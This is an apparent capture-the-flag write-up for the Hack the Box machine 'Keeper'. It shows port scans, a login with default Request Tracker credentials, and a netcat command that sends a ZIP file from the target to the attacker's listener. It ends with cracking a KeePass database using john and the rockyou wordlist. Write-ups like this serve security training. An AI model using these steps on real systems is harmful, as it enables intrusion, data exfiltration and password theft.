# Hack the Box - Keeper

```
rustscan -a 10.10.11.227 -r 0-65535 --ulimit 5000 
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/66939215-b494-486c-91cf-c24c5845167d)

```
nmap -sV -sC -A --min-rate 1000 10.10.11.227 -p 22,80
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d9b95b35-fff7-471f-9257-09aa865cc3f9)

## HTTP
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/f306fea0-644b-4415-b2d4-d5a5041ce776)

![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ad643d0d-40bb-45e9-96a4-922da6d26d45)

Request Tracker Default Credentials
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/cf2f5581-c7de-4cb1-8f59-a469adf05737)

Dashboard
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bc5655f3-6405-4a33-a712-a8941dcafc80)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4bb08dfa-b361-4be2-8d75-66e7c7f6f7c7)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/22b263dc-63ec-49df-baf0-d33b2a0af87c)

SSH
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b612ec6c-ad5c-4eab-8ffe-1278d26e3cf9)

![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/f50378d9-1cdc-4a82-9759-03579c745ba9)

Sending the ZIP file:
```
nc -N 10.10.14.61 9090 < RT30000.zip
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/93b150a1-152b-40f1-aa39-af4065c1e762)

Receiving the ZIP file:
```
nc -l -p 9090 > keeper.zip
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8b230c17-acee-4527-9086-cb9e3185991a)

Unzip:
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8ec9d78e-9d40-4420-b4cb-517a8f99204b)

Cracking KeePass Database:
```
keepass2john passcodes.kdbx > passcodes.hash
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt passcodes.hash
```